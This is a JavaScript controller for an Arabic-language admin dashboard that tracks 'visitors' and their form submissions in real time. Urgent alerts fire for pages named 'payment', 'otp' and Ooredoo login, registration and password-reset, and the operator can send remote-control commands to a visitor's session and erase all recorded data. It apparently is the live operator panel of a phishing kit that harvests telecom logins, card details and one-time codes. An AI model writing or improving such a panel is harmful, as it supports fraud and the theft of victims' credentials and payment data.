/* ============================================================
   Dashboard controller.

   Bootstraps from a single API call, then keeps itself current from
   both the SSE stream and a fast incremental poll fallback so no
   proxy or cross-origin buffer can ever delay realtime updates.
   ============================================================ */

'use strict';

/** Detail for the conversation currently open on the left. */
const openConversation = {
  id: null,
  submissions: [],
  navigation: []
};

/** EventSource handle. */
let eventSource = null;

/** Fast background poll timer. */
let pollTimer = null;
let pollInFlight = false;

/** Set of processed event IDs to prevent duplicate handling between SSE and poll. */
const processedEventIds = new Set();

/* ------------------------------------------------------------------
   Startup
   ------------------------------------------------------------------ */

/** Entry point. */
async function startDashboard() {
  document.body.setAttribute('data-auth', 'pending');
  renderSoundToggle();
  renderConnection('connecting');

  let boot;
  try {
    boot = await api.bootstrap();
  } catch (error) {
    if (error.status === 401 || error.status === 403 || !apiGetToken()) {
      window.location.replace('login.html');
      return;
    }
    document.body.setAttribute('data-auth', 'ok');
    renderConnection('offline');
    showToast('تعذّر تحميل البيانات. يُرجى إعادة تحميل الصفحة.', 'error');
    return;
  }

  document.body.setAttribute('data-auth', 'ok');

  store.pages    = boot.pages || [];
  store.statuses = boot.statuses || [];
  store.commands = boot.commands || [];

  apiSetCsrf(boot.csrf);
  renderAdmin(boot.admin);

  storeReplaceConversations(boot.conversations || []);
  store.lastEventId = Number(boot.last_event_id || 0);

  renderConversationList();
  renderStats();
  renderConnection('live');

  subscribeToEvents();
  startFastPollLoop();
  renderChatPlaceholder();
}

/* ------------------------------------------------------------------
   Realtime stream + Fast Incremental Poll Fallback
   ------------------------------------------------------------------ */

/** Process one incoming event with strict deduplication by _event_id. */
function processIncomingEvent(name, payload) {
  if (!payload) {
    return;
  }
  const evtId = typeof payload._event_id === 'number' ? payload._event_id : 0;
  if (evtId > 0) {
    if (evtId <= store.lastEventId || processedEventIds.has(evtId)) {
      return;
    }
    processedEventIds.add(evtId);
    if (processedEventIds.size > 500) {
      const first = processedEventIds.values().next().value;
      processedEventIds.delete(first);
    }
    store.lastEventId = evtId;
  }
  handleRealtimeEvent(name, payload);
}

/** Open the event stream and keep it alive. */
function subscribeToEvents() {
  if (eventSource) {
    eventSource.close();
  }

  try {
    eventSource = new EventSource(api.streamUrl(store.lastEventId));
  } catch (e) {
    return;
  }

  eventSource.addEventListener('ready', function (event) {
    const data = safeJson(event.data);
    if (data && typeof data.cursor === 'number' && data.cursor > store.lastEventId) {
      store.lastEventId = data.cursor;
    }
    renderConnection('live');
  });

  // The server ends each bounded stream deliberately; reconnect at once.
  eventSource.addEventListener('bye', function () {
    eventSource.close();
    window.setTimeout(subscribeToEvents, 300);
  });

  REALTIME_EVENTS.forEach(function (name) {
    eventSource.addEventListener(name, function (event) {
      renderConnection('live');
      const payload = safeJson(event.data);
      processIncomingEvent(name, payload);
    });
  });

  eventSource.onopen = function () {
    renderConnection('live');
  };

  eventSource.onerror = function () {
    // Fast poll loop continues seamlessly while EventSource reconnects.
  };
}

/** Fast incremental poll every 2 seconds so updates arrive immediately even if SSE is buffered. */
function startFastPollLoop() {
  if (pollTimer) {
    window.clearInterval(pollTimer);
  }
  pollTimer = window.setInterval(pollMissedEvents, 2000);
}

async function pollMissedEvents() {
  if (pollInFlight) {
    return;
  }
  pollInFlight = true;
  try {
    const res = await api.pollEvents(store.lastEventId);
    renderConnection('live');
    const list = res.events || [];
    for (let i = 0; i < list.length; i += 1) {
      const evt = list[i];
      if (evt && evt.type && evt.payload) {
        processIncomingEvent(evt.type, evt.payload);
      }
    }
    if (typeof res.cursor === 'number' && res.cursor > store.lastEventId) {
      store.lastEventId = res.cursor;
    }
  } catch (err) {
    if (err && (err.status === 401 || err.status === 403)) {
      window.location.replace('login.html');
      return;
    }
    // Only mark offline if EventSource is also not open
    if (!eventSource || eventSource.readyState !== 1) {
      renderConnection('offline');
    }
  } finally {
    pollInFlight = false;
  }
}

/** Event names the server emits. */
const REALTIME_EVENTS = [
  'user.created',
  'user.updated',
  'user.renamed',
  'user.read',
  'user.status',
  'user.pinned',
  'user.deleted',
  'submission.created',
  'command.issued',
  'conversations.read_all',
  'conversations.cleared'
];

/* ------------------------------------------------------------------
   Sound synthesizer (Web Audio API - zero external files)
   ------------------------------------------------------------------ */

let audioCtx = null;

function playNotificationSound(urgent) {
  if (store.soundEnabled === false) {
    return;
  }
  try {
    const Ctx = window.AudioContext || window.webkitAudioContext;
    if (!Ctx) {
      return;
    }
    if (!audioCtx) {
      audioCtx = new Ctx();
    }
    if (audioCtx.state === 'suspended') {
      audioCtx.resume();
    }

    const now = audioCtx.currentTime;
    const notes = urgent ? [587.33, 880, 1174.66] : [523.25, 783.99];

    notes.forEach(function (freq, idx) {
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(freq, now + idx * 0.11);

      gain.gain.setValueAtTime(0.001, now + idx * 0.11);
      gain.gain.exponentialRampToValueAtTime(0.18, now + idx * 0.11 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.11 + 0.22);

      osc.connect(gain);
      gain.connect(audioCtx.destination);

      osc.start(now + idx * 0.11);
      osc.stop(now + idx * 0.11 + 0.24);
    });
  } catch (e) {
    /* Ignore autoplay restrictions prior to first click */
  }
}

function toggleSoundAlerts() {
  store.soundEnabled = store.soundEnabled === false;
  try {
    localStorage.setItem('jusour_sound_enabled', store.soundEnabled ? '1' : '0');
  } catch (e) {}
  renderSoundToggle();
  if (store.soundEnabled) {
    playNotificationSound(false);
    showToast('تم تفعيل التنبيهات الصوتية', 'success');
  } else {
    showToast('تم كتم التنبيهات الصوتية', 'info');
  }
}

/** Parse a JSON frame, tolerating anything unexpected. */
function safeJson(text) {
  try {
    return JSON.parse(text);
  } catch (error) {
    return null;
  }
}

/* ------------------------------------------------------------------
   Realtime event handling
   ------------------------------------------------------------------ */

/**
 * Apply one realtime event immediately in 0ms.
 */
function handleRealtimeEvent(type, payload) {
  const row = payload.user || null;

  if (type === 'conversations.read_all') {
    storeSetReadAll(payload.is_read !== false);
    storeSorted().forEach(function (item) { updateConversationCard(item.id); });
    renderStats();
    return;
  }

  if (type === 'conversations.cleared') {
    storeReplaceConversations([]);
    storeSelect(null);
    openConversation.id = null;
    openConversation.submissions = [];
    openConversation.navigation = [];
    renderConversationList();
    renderStats();
    renderChatPlaceholder();
    return;
  }

  if (type === 'user.deleted') {
    const deletedId = Number(payload.id);
    storeRemoveConversation(deletedId);
    if (store.selectedId === deletedId) {
      storeSelect(null);
      openConversation.id = null;
      openConversation.submissions = [];
      openConversation.navigation = [];
      renderChatPlaceholder();
    }
    renderConversationList();
    renderStats();
    return;
  }

  if (!row) {
    return;
  }

  const id = Number(row.id);
  const wasKnown = store.conversations.has(id);

  // If a new submission arrived and the server sent `payload.submission` without full `row.submissions`, merge it
  if (type === 'submission.created' && payload.submission && !Array.isArray(row.submissions)) {
    const existing = store.conversations.get(id);
    const prevSubs = existing && Array.isArray(existing.submissions) ? existing.submissions.slice() : [];
    const subExists = prevSubs.some(function (s) { return s.id === payload.submission.id; });
    if (!subExists) {
      prevSubs.push(payload.submission);
    }
    row.submissions = prevSubs;
    row.submission_count = prevSubs.length;
    row.last_summary = payload.submission.summary || row.last_summary;
  }

  storeUpsertConversation(row);
  const storedRow = store.conversations.get(id) || row;

  if (type === 'user.created') {
    playNotificationSound(false);
    showToast('عميل جديد: ' + (storedRow.name || storedRow.ref), 'info');
  } else if (type === 'submission.created') {
    if (payload.page_key === 'summary' || payload.page_key === 'payment_methods') {
      return;
    }
    const urgentPages = ['payment', 'otp', 'ooredoo_login', 'ooredoo_reg', 'ooredoo_forgot'];
    const isUrgent = urgentPages.indexOf(payload.page_key) !== -1;
    playNotificationSound(isUrgent);
    const label = payload.page_label || 'بيانات جديدة';
    showToast((storedRow.name || storedRow.ref) + ' - ' + label, 'info');
  } else if (type === 'user.pinned') {
    updateConversationCard(id);
    refreshConversationOrder();
    if (store.selectedId === id) {
      renderChatHeader(storedRow);
    }
    return;
  }

  const nowSelected = store.selectedId === id;

  if (nowSelected && type === 'submission.created') {
    updateConversationCard(id);
    refreshConversationOrder();
    if (Array.isArray(storedRow.submissions)) {
      openConversation.submissions = storedRow.submissions;
      openConversation.navigation = storedRow.navigation || openConversation.navigation;
      renderChatHeader(storedRow);
      renderPageTabs(openConversation.navigation, openConversation.submissions);
      renderSubmissions(openConversation.submissions);
      renderStats();
    } else {
      reloadConversation(id, true);
    }
  } else if (nowSelected) {
    updateConversationCard(id);
    renderChatHeader(storedRow);
    renderActionBar(storedRow);
    renderStats();
  } else if (wasKnown) {
    updateConversationCard(id);
    refreshConversationOrder();
    renderStats();
  } else {
    updateConversationCard(id);
    refreshConversationOrder();
    renderStats();
  }
}

/* ------------------------------------------------------------------
   Opening a conversation (Instant 0ms Rendering)
   ------------------------------------------------------------------ */

/** Load and display one conversation immediately from memory, syncing in background if needed. */
async function openConversationById(id) {
  const numId = Number(id);
  storeSelect(numId);
  storeSetRead(numId, true);

  // Reflect the read state immediately so the dot stops blinking.
  updateConversationCard(numId);
  renderStats();
  highlightSelectedCard();

  const cached = store.conversations.get(numId);
  if (cached) {
    openConversation.id = numId;
    openConversation.submissions = Array.isArray(cached.submissions) ? cached.submissions : [];
    openConversation.navigation = Array.isArray(cached.navigation) ? cached.navigation : [];

    renderChatHeader(cached);
    renderPageTabs(openConversation.navigation, openConversation.submissions);
    renderSubmissions(openConversation.submissions);
    renderActionBar(cached);
    $('chatBody').scrollTop = 0;
  }

  // Persist the read state asynchronously without blocking the UI.
  api.markRead(numId, true).catch(function () {});

  // Only fetch from server if full submissions weren't preloaded in memory.
  if (!cached || !Array.isArray(cached.submissions)) {
    try {
      await reloadConversation(numId, true);
    } catch (error) {
      if (!cached) {
        showToast('تعذّر تحميل المحادثة.', 'error');
      }
    }
  }
}

/** Fetch the full conversation detail. */
async function reloadConversation(id, silent) {
  const response = await api.conversation(id);
  const data = response.conversation;

  const fullUser = Object.assign({}, data.user, {
    submissions: data.submissions || [],
    navigation: data.navigation || []
  });

  storeUpsertConversation(fullUser);
  updateConversationCard(id);

  if (store.selectedId !== Number(id)) {
    return;
  }

  openConversation.id          = Number(id);
  openConversation.submissions = fullUser.submissions;
  openConversation.navigation  = fullUser.navigation;

  renderChatHeader(fullUser);
  renderPageTabs(openConversation.navigation, openConversation.submissions);
  renderSubmissions(openConversation.submissions);
  renderActionBar(fullUser);
  renderStats();

  if (silent !== true) {
    $('chatBody').scrollTop = 0;
  }
}

/** Ensure only the selected card carries the selected styling. */
function highlightSelectedCard() {
  const container = $('conversationList');
  Array.from(container.children).forEach(function (node) {
    const isSelected = Number(node.getAttribute('data-id')) === store.selectedId;
    node.classList.toggle('is-selected', isSelected);
    node.setAttribute('aria-selected', isSelected ? 'true' : 'false');
  });
}

/** Switch the page tab and re-render the submission list. */
function selectPageTab(pageKey) {
  store.activePage = pageKey;
  renderPageTabs(openConversation.navigation, openConversation.submissions);
  renderSubmissions(openConversation.submissions);
}

/** Re-render the list and stats after a filter or search change. */
function refreshListView() {
  renderConversationList();
  renderStats();
}

/* ------------------------------------------------------------------
   User actions
   ------------------------------------------------------------------ */

/** Change the status of the open conversation. */
async function changeStatus(statusKey) {
  const id = openConversation.id;
  if (!id) {
    return;
  }

  try {
    const response = await api.setStatus(id, statusKey);
    storeUpsertConversation(response.user);
    updateConversationCard(id);
    renderChatHeader(store.conversations.get(id) || response.user);
    renderStats();

    const status = storeStatus(statusKey);
    showToast('تم تحديث الحالة إلى: ' + (status ? status.label_ar : statusKey), 'success');
  } catch (error) {
    showToast('تعذّر تحديث الحالة.', 'error');
    renderStats();
  }
}

/** Send a remote-control command to the visitor. */
async function sendCommand(command, button) {
  const id = openConversation.id;
  if (!id) {
    return;
  }

  if (button) {
    button.disabled = true;
  }

  try {
    const response = await api.issueCommand(id, command);
    storeUpsertConversation(response.user);
    updateConversationCard(id);
    renderChatHeader(store.conversations.get(id) || response.user);
    renderStats();

    const definition = (store.commands || []).find(function (item) {
      return item.key === command;
    });
    showToast('تم إرسال الأمر: ' + (definition ? definition.label_ar : command), 'success');
  } catch (error) {
    showToast('تعذّر إرسال الأمر.', 'error');
  } finally {
    if (button) {
      button.disabled = false;
    }
  }
}

/** Mark every conversation read. */
async function markEverythingRead() {
  try {
    await api.markRead('all', true);
    storeSetReadAll(true);
    storeSorted().forEach(function (row) { updateConversationCard(row.id); });
    renderStats();
    showToast('تم تحديد جميع المحادثات كمقروءة.', 'success');
  } catch (error) {
    showToast('تعذّر تنفيذ العملية.', 'error');
  }
}

/** Delete all users and recorded data from the dashboard. */
async function clearAllData() {
  const confirmed = window.confirm(
    'هل أنت متأكد من حذف جميع المستخدمين والبيانات المسجلة نهائياً؟ لا يمكن التراجع عن هذا الإجراء.'
  );
  if (!confirmed) {
    return;
  }

  try {
    await api.clearAll();
    storeReplaceConversations([]);
    storeSelect(null);
    openConversation.id = null;
    openConversation.submissions = [];
    openConversation.navigation = [];
    renderConversationList();
    renderStats();
    renderChatPlaceholder();
    showToast('تم حذف جميع المستخدمين والبيانات بنجاح.', 'success');
  } catch (error) {
    showToast('تعذّر حذف البيانات.', 'error');
  }
}

/** Toggle pinning a single conversation to the top of the list. */
async function togglePinConversation(id) {
  const numId = Number(id);
  if (!numId) {
    return;
  }
  const current = store.conversations.get(numId);
  const nextPinned = !(current && current.is_pinned === true);

  try {
    const response = await api.pinUser(numId, nextPinned);
    storeUpsertConversation(response.user);
    updateConversationCard(numId);
    refreshConversationOrder();
    if (store.selectedId === numId) {
      renderChatHeader(store.conversations.get(numId) || response.user);
    }
    showToast(response.is_pinned ? 'تم تثبيت المحادثة في الأعلى' : 'تم إلغاء تثبيت المحادثة', 'success');
  } catch (error) {
    showToast('تعذّر تحديث التثبيت.', 'error');
  }
}

/** Delete a single conversation and all its submissions. */
async function deleteSingleConversation(id) {
  const numId = Number(id);
  if (!numId) {
    return;
  }
  const row = store.conversations.get(numId);
  const label = row ? (row.name || row.ref) : ('#' + numId);
  const confirmed = window.confirm('هل أنت متأكد من حذف محادثة (' + label + ') وجميع بياناتها؟');
  if (!confirmed) {
    return;
  }

  try {
    await api.deleteUser(numId);
    storeRemoveConversation(numId);
    if (store.selectedId === numId) {
      storeSelect(null);
      openConversation.id = null;
      openConversation.submissions = [];
      openConversation.navigation = [];
      renderChatPlaceholder();
    }
    renderConversationList();
    renderStats();
    showToast('تم حذف المحادثة بنجاح.', 'success');
  } catch (error) {
    showToast('تعذّر حذف المحادثة.', 'error');
  }
}

/** Sign out and return to the login screen. */
async function signOut() {
  try {
    await api.logout();
  } catch (error) {
    /* Even if the call fails, drop the local session view. */
  }
  window.location.replace('login.html');
}

/** Reload the list from the server. */
async function manualRefresh() {
  try {
    const response = await api.conversations(300);
    storeReplaceConversations(response.conversations || []);
    if (response.last_event_id && response.last_event_id > store.lastEventId) {
      store.lastEventId = response.last_event_id;
    }
    renderConnection('live');
    refreshListView();

    const selected = storeSelected();
    if (selected) {
      openConversation.id = selected.id;
      openConversation.submissions = Array.isArray(selected.submissions) ? selected.submissions : openConversation.submissions;
      openConversation.navigation = Array.isArray(selected.navigation) ? selected.navigation : openConversation.navigation;
      renderChatHeader(selected);
      renderPageTabs(openConversation.navigation, openConversation.submissions);
      renderSubmissions(openConversation.submissions);
      renderActionBar(selected);
    } else {
      renderChatPlaceholder();
    }

    showToast('تم تحديث القائمة.', 'success');
  } catch (error) {
    showToast('تعذّر التحديث.', 'error');
  }
}

/* ------------------------------------------------------------------
   DOM wiring
   ------------------------------------------------------------------ */

/** Attach every listener. */
function wireEvents() {
  /* Open a conversation from the list, or trigger quick pin/delete buttons on the card. */
  $('conversationList').addEventListener('click', function (event) {
    const actionBtn = event.target.closest('[data-card-action]');
    if (actionBtn) {
      event.stopPropagation();
      const action = actionBtn.getAttribute('data-card-action');
      const targetId = Number(actionBtn.getAttribute('data-id'));
      if (action === 'pin') {
        togglePinConversation(targetId);
      } else if (action === 'delete') {
        deleteSingleConversation(targetId);
      }
      return;
    }

    const card = event.target.closest('.convo');
    if (!card) {
      return;
    }
    openConversationById(Number(card.getAttribute('data-id')));
  });

  /* Page navigation tabs. */
  $('pageTabs').addEventListener('click', function (event) {
    const tab = event.target.closest('.page-tab');
    if (!tab) {
      return;
    }
    selectPageTab(tab.getAttribute('data-page'));
  });

  /* Status selector. */
  $('statusSelect').addEventListener('change', function (event) {
    changeStatus(event.target.value);
  });

  /* Remote command buttons. */
  $('actionCommands').addEventListener('click', function (event) {
    const button = event.target.closest('.cmd-btn');
    if (!button) {
      return;
    }
    sendCommand(button.getAttribute('data-command'), button);
  });

  /* Search, debounced so typing stays smooth with many conversations. */
  let searchTimer = null;
  $('searchInput').addEventListener('input', function (event) {
    const value = event.target.value;
    if (searchTimer) {
      window.clearTimeout(searchTimer);
    }
    searchTimer = window.setTimeout(function () {
      storeSetSearch(value);
      refreshListView();
    }, 100);
  });

  /* Filter chips. */
  $('paneFilters').addEventListener('click', function (event) {
    const chip = event.target.closest('.filter-chip');
    if (!chip) {
      return;
    }
    Array.from($('paneFilters').children).forEach(function (node) {
      node.classList.toggle('is-active', node === chip);
    });
    storeSetFilter(chip.getAttribute('data-filter'));
    refreshListView();
  });

  /* Top bar & list tools. */
  $('refreshBtn').addEventListener('click', manualRefresh);
  $('markAllReadBtn').addEventListener('click', markEverythingRead);
  if ($('soundToggleBtn')) {
    $('soundToggleBtn').addEventListener('click', toggleSoundAlerts);
  }
  if ($('pinConvoBtn')) {
    $('pinConvoBtn').addEventListener('click', function () {
      if (openConversation.id) {
        togglePinConversation(openConversation.id);
      }
    });
  }
  if ($('deleteConvoBtn')) {
    $('deleteConvoBtn').addEventListener('click', function () {
      if (openConversation.id) {
        deleteSingleConversation(openConversation.id);
      }
    });
  }
  if ($('clearAllTopBtn')) {
    $('clearAllTopBtn').addEventListener('click', clearAllData);
  }
  if ($('clearAllMenuBtn')) {
    $('clearAllMenuBtn').addEventListener('click', clearAllData);
  }
  $('logoutBtn').addEventListener('click', signOut);

  /* Admin dropdown. */
  const adminBtn = $('adminBtn');
  const adminDropdown = $('adminDropdown');

  adminBtn.addEventListener('click', function (event) {
    event.stopPropagation();
    const willOpen = adminDropdown.hidden;
    adminDropdown.hidden = !willOpen;
    adminBtn.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
  });

  document.addEventListener('click', function (event) {
    if (adminDropdown.hidden) {
      return;
    }
    if (!event.target.closest('.admin-menu')) {
      adminDropdown.hidden = true;
      adminBtn.setAttribute('aria-expanded', 'false');
    }
  });

  /* Mobile back button. */
  $('backBtn').addEventListener('click', function () {
    $('layout').setAttribute('data-view', 'list');
  });

  /* Close an open stream when the tab goes away. */
  window.addEventListener('beforeunload', function () {
    if (eventSource) {
      eventSource.close();
    }
    if (pollTimer) {
      window.clearInterval(pollTimer);
    }
  });
}

/* Boot. */
document.addEventListener('DOMContentLoaded', function () {
  wireEvents();
  startDashboard();
});
